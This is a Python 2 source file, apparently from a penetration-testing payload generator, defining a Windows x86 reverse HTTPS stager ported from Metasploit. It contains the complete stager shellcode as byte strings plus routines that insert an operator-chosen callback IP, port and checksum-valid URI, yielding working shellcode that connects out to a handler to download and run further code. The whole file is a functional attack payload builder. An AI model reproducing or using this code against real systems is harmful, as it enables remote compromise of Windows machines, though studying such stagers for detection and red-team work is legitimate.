# This is a class for the rev_https payload
# Completely ported from the Metasploit Framework
# https://github.com/rapid7/metasploit-framework/blob/master/modules/payloads/stagers/windows/reverse_https.rb

import binascii
import random
import re
import socket
import string
import struct
import sys


class PayloadModule:

    def __init__(self):
        self.name = "Reverse HTTPS Stager (Stage 1)"
        self.description = "Connects back to a handler to download and run\
            fun files over HTTPS :)"
        self.cli_name = "rev_https"
        self.platform = "Windows"
        self.arch = "x86"
        self.lport = 4444
        self.lhost = None   # '192.168.63.133\x00' this is encoded('string-escape') and appended to the end
        self.lport_offset = 180  # This is actually going to be little endian
        self.uri_offset = 272
        self.exit_func = '\xf0\xb5\xa2\x56'
        self.customized_shellcode = ''
        # The \x5c and \x11 are overwritten by the lport value
        self.stager = (
            "\xFC\xE8\x86\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B" +
            "\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0" +
            "\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF0\x52\x57" +
            "\x8B\x52\x10\x8B\x42\x3C\x8B\x4C\x10\x78\xE3\x4A\x01\xD1\x51\x8B" +
            "\x59\x20\x01\xD3\x8B\x49\x18\xE3\x3C\x49\x8B\x34\x8B\x01\xD6\x31" +
            "\xFF\x31\xC0\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF4\x03\x7D\xF8" +
            "\x3B\x7D\x24\x75\xE2\x58\x8B\x58\x24\x01\xD3\x66\x8B\x0C\x4B\x8B" +
            "\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24\x5B\x5B\x61" +
            "\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12\xEB\x89\x5D\x68\x6E\x65" +
            "\x74\x00\x68\x77\x69\x6E\x69\x54\x68\x4C\x77\x26\x07\xFF\xD5\x31" +
            "\xDB\x53\x53\x53\x53\x53\x68\x3A\x56\x79\xA7\xFF\xD5\x53\x53\x6A" +
            "\x03\x53\x53\x68\x5C\x11\x00\x00\xEB\x4E\x50\x68\x57\x89\x9F\xC6" +
            "\xFF\xD5\x53\x68\x00\x32\xE0\x84\x53\x53\x53\xEB\x3D\x53\x50\x68" +
            "\xEB\x55\x2E\x3B\xFF\xD5\x96\x6A\x10\x5F\x68\x80\x33\x00\x00\x89" +
            "\xE0\x6A\x04\x50\x6A\x1F\x56\x68\x75\x46\x9E\x86\xFF\xD5\x53\x53" +
            "\x53\x53\x56\x68\x2D\x06\x18\x7B\xFF\xD5\x85\xC0\x75\x18\x4F\x75" +
            "\xD9\x68\xF0\xB5\xA2\x56\xFF\xD5\xEB\x42\xE8\xBE\xFF\xFF\xFF\x2F" +
            "\x31\x32\x33\x34\x35\x00\x6A\x40\x68\x00\x10\x00\x00\x68\x00\x00" +
            "\x40\x00\x53\x68\x58\xA4\x53\xE5\xFF\xD5\x93\x53\x53\x89\xE7\x57" +
            "\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xE2\xFF\xD5\x85\xC0" +
            "\x74\xBF\x8B\x07\x01\xC3\x85\xC0\x75\xE5\x58\xC3\xE8\x69\xFF\xFF" +
            "\xFF")

    def set_attrs(self, lport_value, lhost_value):
        self.lport = lport_value

        # Check if given a domain or IP address:
        if self.validate_ip(lhost_value):
            self.lhost = lhost_value
        else:
            try:
                self.lhost = socket.gethostbyname(lhost_value)
            except socket.gaierror:
                print "[*] Error: Invalid domain or IP provided for LHOST value!"
                print "[*] Error: Please re-run with the correct value."
                sys.exit()

        return

    def gen_shellcode(self):
        # Take the passed in attributes and gen shellcode
        ip_shellcode = ''
        n = 2
        ip_shellcode_stage = binascii.hexlify(self.lhost)
        ip_shellcode_stage = [ip_shellcode_stage[i:i+n] for i in range(0, len(ip_shellcode_stage), n)]
        for two_bytes in ip_shellcode_stage:
            ip_shellcode += '\\x' + two_bytes

        # convert port to shellcode
        port_shellcode_stage = str(hex(self.lport).lstrip('0'))
        if len(port_shellcode_stage.lstrip('x')) == 3:
            # detect if odd number, is so, need to add a '0' to the front
            port_1half = '0' + port_shellcode_stage[0:2].lstrip('x')
            port_1half = '\\x' + port_1half
            port_2half = port_shellcode_stage[2:4]
            port_2half = '\\x' + port_2half
            port_little_endian = port_2half + port_1half
        elif len(port_shellcode_stage.lstrip('x')) == 4:
            port_1half = port_shellcode_stage[1:3]
            port_1half = '\\x' + port_1half
            port_2half = port_shellcode_stage[3:5]
            port_2half = '\\x' + port_2half
            port_little_endian = port_2half + port_1half
        elif len(port_shellcode_stage.lstrip('x')) == 2:
            port_1half = port_shellcode_stage[1:3].lstrip('x')
            port_1half = '\\x' + port_1half
            port_2half = '00'
            port_2half = '\\x' + port_2half
            port_little_endian = port_1half + port_2half
        elif len(port_shellcode_stage.lstrip('x')) == 1:
            port_1half = port_shellcode_stage.lstrip('x')
            port_1half = '\\x0' + port_1half
            port_2half = '\\x00'
            port_little_endian = port_1half + port_2half

        # Get the URI that will be used to check in
        incoming_uri = self.gen_uri()

        # Convert the URI for use within shellcode
        uri_shellcode = ''
        hexed_uri = binascii.hexlify(incoming_uri)
        hexed_uri = [hexed_uri[i:i+n] for i in range(0, len(hexed_uri), n)]
        for two_bites in hexed_uri:
            uri_shellcode += '\\x' + two_bites

        final_https_shellcode = self.stager[0:self.lport_offset]
        final_p1 = "\\x" + '\\x'.join(final_https_shellcode.encode('hex')[i:i+2] for i in range(0, len(final_https_shellcode.encode('hex')), 2))
        final_p1 += port_little_endian   # Add 91 bytes to get to URI offset
        final_https_shellcode = self.stager[self.lport_offset + 2:self.uri_offset]
        final_p2 = "\\x" + '\\x'.join(final_https_shellcode.encode('hex')[i:i+2] for i in range(0, len(final_https_shellcode.encode('hex')), 2))
        final_p2 += uri_shellcode + "\x00".encode('string-escape')
        final_https_shellcode = self.stager[self.uri_offset + 5:]
        final_p3 = "\\x" + '\\x'.join(final_https_shellcode.encode('hex')[i:i+2] for i in range(0, len(final_https_shellcode.encode('hex')), 2))
        final_p3 += ip_shellcode
        final_p3 += "\x00".encode('string-escape')

        self.customized_shellcode = final_p1 + final_p2 + final_p3

    def print_shellcode(self):
        print self.customized_shellcode
        return

    def checksum_eight(self, string_checked):
        current_sum = 0
        num_Bs = len(string_checked)
        letter_values = struct.unpack("B" * num_Bs, string_checked)
        for value in letter_values:
            current_sum += value
        return current_sum % 0x100

    def gen_uri(self):
        goal_sum = 92
        all_characters = list(string.digits + string.ascii_letters)
        while True:
            uri = ''.join(random.choice(string.ascii_letters + string.digits) for x in range(3))
            for character in all_characters:
                full_uri = uri + character
                string_sum = self.checksum_eight(full_uri)
                if string_sum == goal_sum:
                    return full_uri

    def payload_stats(self, cli_info):
        print "Payload Name: " + self.name
        print "IP Address: " + cli_info.ip
        print "Port: " + str(cli_info.port)
        print "Shellcode Size: " + str(len(self.customized_shellcode.decode('string-escape'))) + '\n'
        return

    def validate_ip(self, val_ip):
        # This came from (Mult-line link for pep8 compliance)
        # http://python-iptools.googlecode.com/svn-history/r4
        # /trunk/iptools/__init__.py
        ip_re = re.compile(r'^(\d{1,3}\.){0,3}\d{1,3}$')
        if ip_re.match(val_ip):
            quads = (int(q) for q in val_ip.split('.'))
            for q in quads:
                if q > 255:
                    return False
            return True
        return False
